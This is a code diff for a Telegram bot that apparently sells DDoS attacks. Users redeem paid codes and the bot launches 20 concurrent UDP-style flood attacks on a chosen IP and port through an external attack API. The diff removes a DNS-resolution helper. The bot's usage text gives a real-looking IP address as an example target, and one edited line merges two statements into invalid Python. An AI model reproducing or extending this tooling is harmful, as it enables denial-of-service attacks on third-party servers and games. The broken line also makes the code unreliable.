@@ -1,4 +1,4 @@
-# app.py - COMPLETE FIXED VERSION WITH NEW METHODS
+# app.py - COMPLETE FIXED VERSION
 import os
 import logging
 import asyncio
@@ -21,8 +21,6 @@ from telegram.ext import (
 )
 from pymongo import MongoClient
 from dotenv import load_dotenv
-import socket
-import dns.resolver
 
 load_dotenv()
 
@@ -97,7 +95,7 @@ class Database:
                     "banned_by": None,
                     "banned_at": None,
                     "last_attack_time": None,
-                    "redeem_date": None  # Track when code was redeemed
+                    "redeem_date": None
                 }},
                 upsert=True
             )
@@ -130,23 +128,13 @@ class Database:
         
         plan = user.get("plan", "free")
         expiry = user.get("plan_expiry")
-        redeem_date = user.get("redeem_date")
         
-        # Handle string expiry
         if expiry and isinstance(expiry, str):
             try:
                 expiry = datetime.fromisoformat(expiry)
             except:
                 expiry = None
         
-        # Handle string redeem_date
-        if redeem_date and isinstance(redeem_date, str):
-            try:
-                redeem_date = datetime.fromisoformat(redeem_date)
-            except:
-                redeem_date = None
-        
-        # Check if expired - ONLY if expiry exists
         if expiry and isinstance(expiry, datetime):
             if expiry < datetime.now():
                 plan = "free"
@@ -312,17 +300,12 @@ class Database:
         if not self.memory_mode:
             code_data = self.codes.find_one({"code": code, "is_used": False})
             if code_data:
-                # Mark code as used
                 self.codes.update_one(
                     {"code": code},
                     {"$set": {"is_used": True, "used_by": user_id, "used_at": datetime.now()}}
                 )
-                # Calculate expiry
                 expiry = datetime.now() + timedelta(days=code_data['access_days'])
                 expiry_str = expiry.isoformat()
-                redeem_date_str = datetime.now().isoformat()
-                
-                # Update user plan with proper expiry
                 self.users.update_one(
                     {"user_id": user_id},
                     {"$set": {
@@ -330,7 +313,7 @@ class Database:
                         "plan_expiry": expiry_str,
                         "has_used_code": True,
                         "code_used": code,
-                        "redeem_date": redeem_date_str
+                        "redeem_date": datetime.now().isoformat()
                     }}
                 )
                 return code_data
@@ -538,33 +521,6 @@ class AttackManager:
 
 attack_manager = AttackManager()
 
-# ===== DNS RESOLVER =====
-async def resolve_dns(target):
-    """Resolve domain to IP address"""
-    try:
-        # Check if it's already an IP
-        try:
-            socket.inet_aton(target)
-            return target
-        except socket.error:
-            pass
-        
-        # Resolve DNS
-        try:
-            answers = dns.resolver.resolve(target, 'A')
-            for rdata in answers:
-                return str(rdata)
-        except:
-            # Fallback to socket
-            try:
-                return socket.gethostbyname(target)
-            except:
-                pass
-        return target
-    except Exception as e:
-        logger.error(f"DNS resolution failed for {target}: {e}")
-        return target
-
 # ===== SEND ALERT TO ADMINS =====
 async def send_attack_alert(attack_info):
     try:
@@ -615,12 +571,9 @@ async def send_api_attack(target, port, duration, attack_num, method="udp"):
     
     api_method = method_map.get(method.lower(), "udp")
     
-    # Resolve DNS for target
-    resolved_target = await resolve_dns(target)
-    
     params = {
         "key": API_KEY,
-        "host": resolved_target,
+        "host": target,
         "port": port,
         "time": duration,
         "method": api_method
@@ -646,7 +599,6 @@ async def send_api_attack(target, port, duration, attack_num, method="udp"):
                         "success": True,
                         "attack_num": attack_num,
                         "method": api_method,
-                        "target": resolved_target,
                         "status": response.status,
                         "elapsed": f"{elapsed:.2f}s"
                     }
@@ -655,7 +607,6 @@ async def send_api_attack(target, port, duration, attack_num, method="udp"):
                         "success": False,
                         "attack_num": attack_num,
                         "method": api_method,
-                        "target": resolved_target,
                         "status": response.status,
                         "elapsed": f"{elapsed:.2f}s"
                     }
@@ -666,7 +617,6 @@ async def send_api_attack(target, port, duration, attack_num, method="udp"):
             "success": False,
             "attack_num": attack_num,
             "method": api_method,
-            "target": resolved_target,
             "error": str(e)
         }
 
@@ -674,14 +624,10 @@ async def send_api_attack(target, port, duration, attack_num, method="udp"):
 async def send_20_concurrent_attacks(target, port, duration, user_id, context, method="udp"):
     logger.info(f"🚀 Launching 20 concurrent {method} attacks on {target}:{port}")
     
-    # Resolve DNS for display
-    resolved_target = await resolve_dns(target)
-    
     status_msg = await context.bot.send_message(
         chat_id=user_id,
         text=f"🔥 *ATTACK RUNNING*\n\n"
-             f"🎯 Target: `{target}` → `{resolved_target}`\n"
-             f"🔌 Port: `{port}`\n"
+             f"🎯 Target: `{target}:{port}`\n"
              f"⏱️ Duration: `{duration}s`\n"
              f"📡 Method: `{method.upper()}`\n"
              f"⚡ Attacks: `20 CONCURRENT`\n"
@@ -703,8 +649,7 @@ async def send_20_concurrent_attacks(target, port, duration, user_id, context, m
     
     final_text = (
         f"✅ *20x {method.upper()} ATTACK COMPLETE!*\n\n"
-        f"🎯 Target: `{target}` → `{resolved_target}`\n"
-        f"🔌 Port: `{port}`\n"
+        f"🎯 Target: `{target}:{port}`\n"
         f"⏱️ Duration: `{duration}s`\n"
         f"📡 Method: `{method.upper()}`\n"
         f"🎯 Attacks: `{success_count}/20 SUCCESSFUL`\n"
@@ -719,7 +664,6 @@ async def send_20_concurrent_attacks(target, port, duration, user_id, context, m
         "successful": success_count,
         "results": results,
         "target": target,
-        "resolved_target": resolved_target,
         "port": port,
         "duration": duration,
         "method": method
@@ -729,9 +673,6 @@ async def update_timer(status_msg, duration, target, port, method="udp"):
     try:
         start_time = time.time()
         last_update = 0
-        
-        # Resolve DNS once for display
-        resolved_target = await resolve_dns(target)
         
         while True:
             elapsed = time.time() - start_time
@@ -745,8 +686,7 @@ async def update_timer(status_msg, duration, target, port, method="udp"):
                 try:
                     await status_msg.edit_text(
                         f"🔥 *ATTACK RUNNING*\n\n"
-                        f"🎯 Target: `{target}` → `{resolved_target}`\n"
-                        f"🔌 Port: `{port}`\n"
+                        f"🎯 Target: `{target}:{port}`\n"
                         f"⏱️ Duration: `{duration}s`\n"
                         f"📡 Method: `{method.upper()}`\n"
                         f"⚡ Attacks: `20 CONCURRENT`\n"
@@ -1001,8 +941,7 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 )
                 return
     
-    args = context.args
-    if len(args) < 3:
+    args = context.args    if len(args) < 3:
         await update.message.reply_text(
             "❌ *Usage:* `/attack IP PORT TIME`\n\n"
             "Example: `/attack 91.108.17.41 32001 60`\n\n"
@@ -1881,7 +1820,7 @@ async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         
         verify = db.get_user(user_id)
-        logger.info(f"User {user_id} after redeem - Plan: {verify.get('plan') if verify else 'None'}, Expiry: {verify.get('plan_expiry') if verify else 'None'}")
+        logger.info(f"User {user_id} after redeem - Plan: {verify.get('plan') if verify else 'None'}")
         
     else:
         await update.message.reply_text(
@@ -2028,7 +1967,6 @@ if __name__ == "__main__":
     print("👑 GURU ATTACK BOT")
     print("⚡ 20x UDP CONCURRENT")
     print("📡 METHODS: UDP, UDPNUKE, UDP-BIG, Telegram-VC, PUBG")
-    print("📌 DNS Resolution Enabled")
     print("📌 API-ONLY - NO FALLBACK")
     print("📌 One attack at a time")
     print(f"⏳ Cooldown: {ATTACK_COOLDOWN}s between attacks")
